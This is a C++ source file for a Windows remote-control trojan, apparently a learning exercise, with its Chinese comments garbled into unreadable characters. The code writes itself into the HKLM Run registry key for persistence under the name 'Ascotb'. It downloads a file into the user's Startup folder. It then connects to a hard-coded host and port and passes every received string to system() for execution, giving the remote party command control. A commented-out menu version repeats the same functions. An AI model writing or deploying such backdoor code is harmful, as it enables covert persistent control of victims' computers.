// RemoteControl.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include<iostream>
#include<WinSock2.h>
#include<Windows.h>
#include<urlmon.h>
#pragma comment(lib,"urlmon.lib")//����һ��Ԥ����ָ��
#pragma comment(lib,"ws2_32.lib")
using namespace std;

BOOL SetRegKeyAutoRun(wchar_t *szKeyName, wchar_t *szPath, const int nPathLen)
{
	bool bRet = false;
	HKEY hKey = { 0 };
	do {
		if (wcslen(szKeyName) == 0)
			break;
		if (wcslen(szPath) == 0)
			break;
		if (nPathLen <= 0)
			break;
		wchar_t *szKeyPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
		//�����Ҫ�޸�ע�����Ҫ����ϵͳAPI  ���Ǹ�һ��ע���ĺ���                                              ����32λע���б�    ����64λ��
		if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_LOCAL_MACHINE, szKeyPath, NULL, KEY_WRITE | KEY_WOW64_64KEY, &hKey))
			//��һ��ֵ��ע���б������Ǹ��ļ�����������HKEY_LOCAK_MACHINE
			//�ڶ���ֵ�Ǿ���·����������ŵ�ע���б��Ǹ��ļ����С�
			//���ĸ�ֵ�ǻ�ȡ��Ȩ����ʲô
			//������������RUN���б�ĵط�HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon�е�Userinit
			break;
		if (ERROR_SUCCESS != RegSetValueEx(hKey, szKeyName, 0, REG_SZ, (byte*)szPath, nPathLen))
			//��һ��ֵ�����ǵõ���ֵ
			//�ڶ��������������������������
			//���ĸ��Ǽ�������
			//������Ǽ�������
			//�������Ǽ��Ĵ�С
			break;
		bRet = true;




	} while (false);
	if (hKey)
		RegCloseKey(hKey);
	return bRet;

}






int main()
{
	
	wchar_t szUrl[MAXBYTE] = L"https://gss2.bdstatic.com/9fo3dSag_xI4khGkpoWK1HF6hhy/baike/s%3D220/sign=f28cef68ac18972ba73a07c8d6cc7b9d/8718367adab44aed0ce96d98b41c8701a18bfb23.jpg";
	wchar_t szPath[MAX_PATH] = L"C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\love.jpg";
	//������������S_OK
	if (S_OK == URLDownloadToFile(nullptr, szUrl, szPath, 0, nullptr))
	{
		
		//printf("������ɣ�������\r\n");
	}
	else
	{
		printf("ʧ���ˣ�������\r\n");
	}



	wchar_t szFilePath[MAX_PATH] = { 0 };//�ļ���·��
										 //��ȡ�ļ���·��
										 //ʹ��nullptr��Ĭ��ȡ���ļ�
	int nError = GetModuleFileName(nullptr, szFilePath, MAX_PATH);
	//�ж��Ƿ������
	//ERROR_SUCCESS��ʾִ�гɹ�
	if (ERROR_SUCCESS != nError)
	{
		//����
		//��������С�޷����·��
		
	}
	if (!SetRegKeyAutoRun(L"Ascotb", szFilePath, (wcslen(szFilePath) + 1) * 2))
	{
		printf("�޸�ע���ʧ�ܣ�������");
	}


		WSADATA wsaData;
		WSAStartup(MAKEWORD(2, 2), &wsaData);
		//�жϰ汾
		if (2 != LOBYTE(wsaData.wVersion) || 2 != HIBYTE(wsaData.wVersion))
		{
			return 0;

		}
		//��socket��Ϣ����������
		SOCKET socketClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (INVALID_SOCKET == socketClient)
		{
			return 0;

		}


		sockaddr_in addServer = { 0 };
		///����....
		addServer.sin_family = AF_INET;
		//�����˿�
		addServer.sin_port = htons(43156);
		//��ȡ��������ַ
		addServer.sin_addr.S_un.S_addr = inet_addr("192.168.1.101");
		//������������
		if (SOCKET_ERROR == connect(socketClient, (SOCKADDR*)&addServer, sizeof(addServer)))
		{
			return 0;
		}
		//�������ܷ������������������
		char szBuffer[MAXBYTE] = { 0 };
		char szComment[MAXBYTE] = { 0 };
		//��Ϊ�棬������ϲ�ͣ�Ľ��շ���������Ϣ
		while (true)
		{
			//��������
			int nRecvLen = recv(socketClient, szBuffer, MAXBYTE, 0);
			//�жϽ��յ�����������0��ʾ����Ϣ
			if (nRecvLen>0)
			{
				//���ڽ�������ֻ��ִ��һ�����ܶ��ִ���������һ�´���
				sprintf_s(szComment, MAXBYTE, "start %s", szBuffer);
				//ʹ�þ������洦�����յ�����
				system(szComment);
			}

		}


	















	/*


	int nInput = 0;
	printf("��������Ҫѡ�ŵĹ��ܣ�\r\n\t1.���ñ�����Ϊ��������\r\n\t2.���ض��ⲡ��\r\n\t3.Զ�̿���\r\n\t");
	scanf("%d", &nInput);
	switch (nInput)
	{
	case 1://�޸�ע���
	{//case��������˱�������ʹ�ô�����
		wchar_t szFilePath[MAX_PATH] = { 0 };//�ļ���·��
											 //��ȡ�ļ���·��
											 //ʹ��nullptr��Ĭ��ȡ���ļ�
		int nError = GetModuleFileName(nullptr, szFilePath, MAX_PATH);
		//�ж��Ƿ������
		//ERROR_SUCCESS��ʾִ�гɹ�
		if (ERROR_SUCCESS != nError)
		{
			//2�ִ���
			//��һ����������С�޷����·��
			//
		}
		if (!SetRegKeyAutoRun(L"AutoRun", szFilePath, (wcslen(szFilePath) + 1) * 2))
		{
			printf("�޸�ע���ʧ�ܣ�������");
		}
	}
	break;
	case 2://����
	{
		wchar_t szUrl[MAXBYTE] = L"";
		wchar_t szPath[MAX_PATH] = L"C:\\demo.exe";
		//������������S_OK
		if (S_OK == URLDownloadToFile(nullptr, szUrl, szPath, 0, nullptr))
		{
			printf("������ɣ�������\r\n");
		}
		else
		{
			printf("ʧ���ˣ�������\r\n");
		}
	}
	break;
	case 3://Զ�̿���
	{

		WSADATA wsaData;
		WSAStartup(MAKEWORD(2, 2), &wsaData);
		//�жϰ汾
		if (2 != LOBYTE(wsaData.wVersion) || 2 != HIBYTE(wsaData.wVersion))
		{
			break;

		}
		//��socket��Ϣ����������
		SOCKET socketClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (INVALID_SOCKET == socketClient)
		{
			break;

		}


		sockaddr_in addServer = { 0 };
		///����....
		addServer.sin_family = AF_INET;
		//�����˿�
		addServer.sin_port = htons(43156);
		//��ȡ��������ַ
		addServer.sin_addr.S_un.S_addr = inet_addr("192.168.1.3");
		//������������
		if (SOCKET_ERROR == connect(socketClient, (SOCKADDR*)&addServer, sizeof(addServer)))
		{
			break;
		}
		//�������ܷ������������������
		char szBuffer[MAXBYTE] = { 0 };
		char szComment[MAXBYTE] = { 0 };
		//��Ϊ�棬������ϲ�ͣ�Ľ��շ���������Ϣ
		while (true)
		{
			//��������
			int nRecvLen = recv(socketClient, szBuffer, MAXBYTE, 0);
			//�жϽ��յ�����������0��ʾ����Ϣ
			if (nRecvLen>0)
			{
				//���ڽ�������ֻ��ִ��һ�����ܶ��ִ���������һ�´���
				sprintf_s(szComment, MAXBYTE, "start %s", szBuffer);
				//ʹ�þ������洦�����յ�����
				system(szComment);
			}

		}


	}
	break;
	default:
		break;
	}

	*/
	WSACleanup();
	system("pause");
	return 0;
}


//int main()
//{
//	����URL
//	wchar_t szUrl[MAXBYTE] = L"";
//	��ŵ�λ��
//	wchar_t szPath[MAX_PATH] = L"C:\\MyDownLoad.exe";
//	URLDownloadToFile(nullptr, szUrl, szPath, 0, nullptr);
//
//
//
//	return 0;
//}
//
